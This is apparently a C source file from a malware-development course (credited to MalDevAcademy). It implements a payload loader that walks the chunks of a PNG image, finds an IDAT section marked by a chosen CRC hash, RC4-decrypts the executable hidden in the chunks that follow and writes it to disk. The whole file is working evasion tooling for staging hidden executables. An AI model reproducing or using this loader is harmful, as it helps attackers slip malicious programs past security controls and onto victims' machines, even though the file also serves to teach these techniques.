// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------

#define RC4_KEY_SIZE		16
#define CHUNK_TYPE_SIZE		4
#define BYTES_TO_SKIP		33		// PNG signature (8) + IHDR header (21) + IHDR CRC (4)
#define PNG_SIGNATURE		0x474E5089	// 'GNP'0x89 
#define IEND_HASH		0xAE426082	// IEND section hash 

// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------

//
//
// TO UPDATE:
//
//
#define MARKED_IDAT_HASH	0x86653285

// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;


VOID Rc4EncryptDecrypt(IN PBYTE pInputBuffer, IN SIZE_T sInputBuffSize, IN PBYTE pRc4Key, IN SIZE_T sRc4KeySize, OUT PBYTE ppOutputBuffer) {

	unsigned int		i		= 0x00;
	unsigned int		j		= 0x00;
	unsigned char*		s		= 0x00;
	unsigned char		temp		= 0x00;
	Rc4Context		context		= { 0 };

	context.i = 0;
	context.j = 0;

	for (i = 0; i < 256; i++)
		context.s[i] = i;

	for (i = 0, j = 0; i < 256; i++) {

		j = (j + context.s[i] + pRc4Key[i % sRc4KeySize]) % 256;
		temp = context.s[i];
		context.s[i] = context.s[j];
		context.s[j] = temp;
	}


	i = context.i;
	j = context.j;
	s = context.s;

	while (sInputBuffSize > 0) {

		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		if (pInputBuffer != NULL && ppOutputBuffer != NULL) {
			*ppOutputBuffer = *pInputBuffer ^ s[(s[i] + s[j]) % 256];
			pInputBuffer++;
			ppOutputBuffer++;
		}

		sInputBuffSize--;
	}

	context.i = i;
	context.j = j;
}


// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------


BOOL ExtractDecryptedPayload(IN PBYTE pPngFileBuffer, IN SIZE_T sPngFileSize, OUT PBYTE* ppDecryptedBuff, OUT PSIZE_T psDecryptedBuffLength) {
	
	SIZE_T			Offset						= BYTES_TO_SKIP,
				sDecPayloadSize					= 0x00;
	DWORD			uSectionLength					= 0x00;
	CHAR			pSectionType[CHUNK_TYPE_SIZE + 1]		= { 0 };
	PBYTE			pRc4Key[RC4_KEY_SIZE]				= { 0 };
	PBYTE			pSectionBuffer					= NULL,
				pTmpPntr					= NULL,
				pDecPayload					= NULL;
	UINT32			uCRC32Hash					= 0x00;
	BOOL			bFoundHash					= FALSE;

	if (*(ULONG*)pPngFileBuffer != PNG_SIGNATURE) {
		printf("[!] Input File Is Not A PNG File \n");
		return FALSE;
	}

	while ((SIZE_T)Offset < sPngFileSize) {
	
		// Fetch section size
		uSectionLength = (pPngFileBuffer[Offset] << 24) | (pPngFileBuffer[Offset + 1] << 16) | (pPngFileBuffer[Offset + 2] << 8) | pPngFileBuffer[Offset + 3];
		Offset += sizeof(DWORD);

		// Fetch section type 
		memset(pSectionType, 0x00, sizeof(pSectionType));
		memcpy(pSectionType, &pPngFileBuffer[Offset], CHUNK_TYPE_SIZE);
		Offset += CHUNK_TYPE_SIZE;

		// Fetch a pointer to the section's data
		pSectionBuffer = (PBYTE)(&pPngFileBuffer[Offset]);
		Offset += uSectionLength;
		
		// Fetch CRC32 hash
		uCRC32Hash = (pPngFileBuffer[Offset] << 24) | (pPngFileBuffer[Offset + 1] << 16) | (pPngFileBuffer[Offset + 2] << 8) | pPngFileBuffer[Offset + 3];
		Offset += sizeof(UINT32);

		printf("[i] Section: %s \n", (CHAR*)pSectionType);
		printf("\t> Buffer: 0x%p \n", pSectionBuffer);
		printf("\t> Length: %d \n", (int)uSectionLength);
		printf("\t> Hash: 0x%0.8X \n", uCRC32Hash);
		
		// End of the png file  
		if (uCRC32Hash == IEND_HASH) 
			break;

		if (uCRC32Hash == MARKED_IDAT_HASH) {
			bFoundHash = TRUE;	
			// The next iteration will be the start of our embedded payload
			continue;			
		}

		if (bFoundHash) {
			
			// Fetch key
			memset(pRc4Key, 0x00, RC4_KEY_SIZE);
			memcpy(pRc4Key, pSectionBuffer, RC4_KEY_SIZE);

			// Modify pointer and size
			pSectionBuffer += RC4_KEY_SIZE;
			uSectionLength -= RC4_KEY_SIZE;

			// Create buffer to hold decrypted section
			if (!(pTmpPntr = LocalAlloc(LPTR, uSectionLength))) {
				printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
				return FALSE;
			}

			// Decrypt
			Rc4EncryptDecrypt(pSectionBuffer, uSectionLength, pRc4Key, RC4_KEY_SIZE, pTmpPntr);

			// Append decrypted data to total buffer (pDecPayload)
			sDecPayloadSize += uSectionLength;
			
			if (!pDecPayload)
				pDecPayload = LocalAlloc(LPTR, sDecPayloadSize);
			else
				pDecPayload = LocalReAlloc(pDecPayload, sDecPayloadSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

			if (!pDecPayload) {
				printf("[!] LocalAlloc/LocalReAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
				return FALSE;
			}
			memcpy(pDecPayload + (sDecPayloadSize - uSectionLength), pTmpPntr, uSectionLength);
			
			// Free temp buffer
			memset(pTmpPntr, 0x00, uSectionLength);
			LocalFree(pTmpPntr);
		}
	}

	if (!bFoundHash)
		printf("[!] Could Not Find IDAT Section With Hash: 0x%0.8X \n", MARKED_IDAT_HASH);

	*ppDecryptedBuff	= pDecPayload;
	*psDecryptedBuffLength	= sDecPayloadSize;
	
	return bFoundHash;
}



// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------




BOOL WriteFileToDiskA(IN LPCSTR cFileName, IN PBYTE pFileBuffer, OUT DWORD dwFileSize) {

	HANDLE		hFile 				= INVALID_HANDLE_VALUE;
	DWORD		dwNumberOfBytesWritten	 	= 0x00;

	if (!cFileName || !pFileBuffer || !dwFileSize)
		goto _END_OF_FUNC;

	printf("[i] Creating %s ... ", cFileName);

	if ((hFile = CreateFileA(cFileName, GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!WriteFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesWritten, NULL) || dwFileSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d \n[i] Wrote %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesWritten, dwFileSize);
		goto _END_OF_FUNC;
	}

	printf("[+] DONE\n");

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return (dwNumberOfBytesWritten == dwFileSize) ? TRUE : FALSE;
}

// ---------------------------------------------------------------------------------------------------------------------------------------------


BOOL ReadFileFromDiskA(IN LPCSTR cFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE		hFile				= INVALID_HANDLE_VALUE;
	DWORD		dwFileSize			= NULL,
			dwNumberOfBytesRead		= NULL;
	PBYTE		pBaseAddress			= NULL;

	if (!cFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer	=	pBaseAddress;
	*pdwFileSize	=	dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pBaseAddress && !*ppFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}

// ---------------------------------------------------------------------------------------------------------------------------------------------


int main() {

	PBYTE	pPngFileBuffer		= NULL,
		pExeFileBuffer		= NULL;

	SIZE_T	sPngFileSize		= 0x00,
		sExeFileSize		= 0x00;

	if (!ReadFileFromDiskA("C:\\Users\\nul0x\\source\\repos\\FetchPayloadFromPng\\Output.png", &pPngFileBuffer, &sPngFileSize))
		return -1;

	if (!ExtractDecryptedPayload(pPngFileBuffer, sPngFileSize, &pExeFileBuffer, &sExeFileSize))
		return - 1;

	return WriteFileToDiskA("HelloWorld.exe", pExeFileBuffer, sExeFileSize) ? 0 : -1;
}




// EOF
